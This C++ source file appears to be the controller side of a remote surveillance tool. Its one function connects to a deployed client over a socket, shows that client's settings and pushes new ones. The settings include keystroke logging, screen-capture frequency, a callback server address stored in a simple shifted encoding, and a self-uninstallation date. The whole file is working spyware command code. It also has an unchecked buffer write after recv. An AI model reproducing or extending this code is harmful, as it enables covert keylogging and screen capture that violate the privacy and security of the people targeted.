#include "Server.h"

void editparams(SOCKET& asock)
{
       int clientFreq, serverPort, scrFreq, res, c, cc;
       long exp;
       char logs[16], screens[16], serverAddr[64], command[1024], response[1024], timebuffer[64], clear[64], *t;
       string totr, ans;
       time_t expd, curd;
       struct tm * timeinfo;
       
       strncpy(command, "E+",1024);
       send(asock, command, (int) strlen(command), 0);
       
       cout << "\n Current parameters:" << endl << endl;
       
                 for (int i = 1 ; i <= 7 ; i ++)
                 {
                     totr.clear();
                     do
                     {
                                  res = recv(asock, response, 1024, 0);
                                  response[res] = '\0';
                                  totr += response;
                     } while (totr[totr.length() - 1] != '+');
                     totr.erase(totr.length() - 1, 1);
                     strncpy(clear, totr.c_str(),64);
                     switch (i)
                     {
                            case 1: cout << " Client connection attempt frequency: ";
                                    t = strtok(clear, " ");
                                    c = atoi(strtok(NULL, " "));
                                    if (c == 1) cout << c << " minute" << endl;
                                    else cout << c << " minutes" << endl;
                                    break;
							case 2: cout << " Server adress: ";
                                    t = strtok(clear, " ");
                                    t = strtok(NULL, " ");
                                    for (cc = 0 ; cc < strlen(t) ; cc ++) t[cc] = t[cc] + 1 + cc;
                                    cout << t << endl;
                                    break;
							case 3: cout << " Server port: ";
                                    t = strtok(clear, " ");
                                    c = atoi(strtok(NULL, " "));
                                    cout << c << endl;
                                    break;
                            case 4: cout << " Screen capture frequency: ";
                                    t = strtok(clear, " ");
                                    c = atoi(strtok(NULL, " "));
                                    if (c == 1) cout << c << " minute" << endl;
                                    else cout << c << " minutes" << endl;
                                    break;
                            case 5: cout << " Keystroke logging: ";
                                    t = strtok(clear, " ");
                                    cout << strtok(NULL, " ") << endl;
                                    break;
                            case 6: cout << " Screen capturing: ";
                                    t = strtok(clear, " ");
                                    cout << strtok(NULL, " ") << endl;
                                    break;
                            case 7: cout << " Software auto-uninstallation date: ";
                                    t = strtok(clear, " ");
                                    expd = atoi(strtok(NULL, " "));
                                    timeinfo = localtime(&expd);
                                    strftime(timebuffer, 64, "%d %B %Y", timeinfo);
                                    cout << timebuffer << endl;
                                    break;
                     }

                     strncpy(command, "OK+",1024);
                     send(asock, command, (int) strlen(command), 0);
                 }
                 
                 totr.clear();
                 do
                 {
                              res = recv(asock, response, 1024, 0);
                              response[res] = '\0';
                              totr += response;
                 } while (totr[totr.length() - 1] != '+');
                 
                 do
                 {
                     cout << "\n Are you sure you want to change them?\n Type 'y' or 'n': ";
                     getline(cin, ans);
                 } while ((ans != "y") && (ans != "n"));
                 if (ans == "n")
                 {
                         PlaySound(TEXT("Abort.wav"), NULL, SND_FILENAME | SND_ASYNC);
                         cout << " Aborting..." << endl;
                         strncpy(command, "NO+",1024);
                         send(asock, command, (int) strlen(command), 0);
                         return;
                 }
                 strncpy(command, "OK+",1024);
                 send(asock, command, (int) strlen(command), 0);
                 
                 totr.clear();
                 do
                 {
                              res = recv(asock, response, 1024, 0);
                              response[res] = '\0';
                              totr += response;
                 } while (totr[totr.length() - 1] != '+');
                 
                 cout << "\n Ok, let's edit the parameters..." << endl;
                 cout << "\n Enter new value for:" << endl;
                 do
                 {
                      cout << " Client connection attempt frequency in minutes (1-300): ";
                      ans.clear();
                      getline(cin, ans);
                      clientFreq = atoi(ans.c_str());
                 } while ((clientFreq < 1) || (clientFreq > 300));
                      cout << " Server address: ";
                      ans.clear();
                      cin.getline(serverAddr, 64);
                do
                 {
                      cout << " Server port: ";
                      ans.clear();
                      getline(cin, ans);
                      serverPort = atoi(ans.c_str());
                 } while ((serverPort < 1) || (serverPort > 99999));
                 do
                 {
                         cout << " Screen capture frequency in minutes (1-300): ";
                         ans.clear();
                         getline(cin, ans);
                         scrFreq = atoi(ans.c_str());
                 } while ((scrFreq < 1) || (scrFreq > 300));
                 do
                 {
                         cout << " Keystroke logging (ON/OFF): ";
                         cin.getline(logs, 16);
                 } while ((strcmp(logs, "ON") != 0) && (strcmp(logs, "OFF") != 0));
                 do
                 {
                         cout << " Screen capturing (ON/OFF): ";
                         cin.getline(screens, 16);
                 } while ((strcmp(screens, "ON") != 0) && (strcmp(screens, "OFF") != 0));
                 do
                 {
                         cout << " Software auto-uninstallation date in days from today (1-600): ";
                         ans.clear();
                         getline(cin, ans);
                         exp = atoi(ans.c_str());
                 } while ((exp < 1) || (exp > 600));

                 sprintf(command, "%d+", clientFreq);
                 send(asock, command, (int) strlen(command), 0);
                 totr.clear();
                 do
                 {
                              res = recv(asock, response, 1024, 0);
                              response[res] = '\0';
                              totr += response;
                 } while (totr[totr.length() - 1] != '+');

                 sprintf(command, "%s+", serverAddr);
                 send(asock, command, (int) strlen(command), 0);
                 totr.clear();
                 do
                 {
                              res = recv(asock, response, 1024, 0);
                              response[res] = '\0';
                              totr += response;
                 } while (totr[totr.length() - 1] != '+');
                 
                 sprintf(command, "%d+", serverPort);
                 send(asock, command, (int) strlen(command), 0);
                 totr.clear();
                 do
                 {
                              res = recv(asock, response, 1024, 0);
                              response[res] = '\0';
                              totr += response;
                 } while (totr[totr.length() - 1] != '+');
				                  
                 sprintf(command, "%d+", scrFreq);
                 send(asock, command, (int) strlen(command), 0);
                 totr.clear();
                 do
                 {
                              res = recv(asock, response, 1024, 0);
                              response[res] = '\0';
                              totr += response;
                 } while (totr[totr.length() - 1] != '+');
                 
                 strncpy(command, logs,1024);
                 strcat(command, "+");
                 send(asock, command, (int) strlen(command), 0);
                 totr.clear();
                 do
                 {
                              res = recv(asock, response, 1024, 0);
                              response[res] = '\0';
                              totr += response;
                 } while (totr[totr.length() - 1] != '+');
                 
                 strncpy(command, screens,1024);
                 strcat(command, "+");
                 send(asock, command, (int) strlen(command), 0);
                 totr.clear();
                 do
                 {
                              res = recv(asock, response, 1024, 0);
                              response[res] = '\0';
                              totr += response;
                 } while (totr[totr.length() - 1] != '+');
                 
                 time(&curd);
                 sprintf(command, "%d+", (exp * 86400) + curd);
                 send(asock, command, (int) strlen(command), 0);
                 totr.clear();
                 do
                 {
                              res = recv(asock, response, 1024, 0);
                              response[res] = '\0';
                              totr += response;
                 } while (totr[totr.length() - 1] != '+');
                 
                 strncpy(command, "GG+",1024);
                 send(asock, command, (int) strlen(command), 0);
                 
                 totr.clear();
                 do
                 {
                              res = recv(asock, response, 1024, 0);
                              response[res] = '\0';
                              totr += response;
                 } while (totr[totr.length() - 1] != '+');
                 cout << "\n Update successful." << endl;
                 
                 return;
}
